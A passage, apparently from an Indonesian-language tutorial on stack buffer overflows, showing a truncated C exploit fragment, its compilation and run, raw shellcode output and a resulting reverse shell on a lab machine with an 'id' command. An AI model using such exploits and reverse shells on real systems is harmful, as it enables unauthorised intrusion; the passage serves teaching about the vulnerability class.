+   long esp, ret, *addr_ptr;
+   char *buffer, *ptr;
+
+   offset = 0; 
+   esp = sp();
+   ret = esp - offset;
+
+   ................
+
+<------ dst, sama seperti exploit sebelum nya. code cut here! ---------------->
+
+
+
+
+[Cyb3rh3b@192.168.116.130]$ gcc exploit-reverse-shell.c -o exploit-reverse-shell
+[Cyb3rh3b@192.168.116.130]$ ./exploit-reverse-shell
+Stack pointer (ESP) : 0xbffff568
+    Offset from ESP : 0x0
+Desired Return Addr : 0xbffff568
+3ÉîÙ$ôÓ|ëô¹béó­ü s  
+þ02/þ2ÐºS`|hõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõ
+Dan selanjut nya...kita akan mendapatkan reverse-shell pada mesin 192.168.116.133
+port 3939:
+
+#
+192.168.116.130: inverse host lookup failed: Host name lookup failure
+connect to [192.168.116.130] from (UNKNOWN) [192.168.116.130] 51441
+id
+uid=1005(rasyid) gid=100(users) groups=100(users)
+
+
+
+
+[ ~ Fyuuuhhh !!!
+
+Panjang yak?!=P. Begitulah kira-kira konsep dasar stack overflow
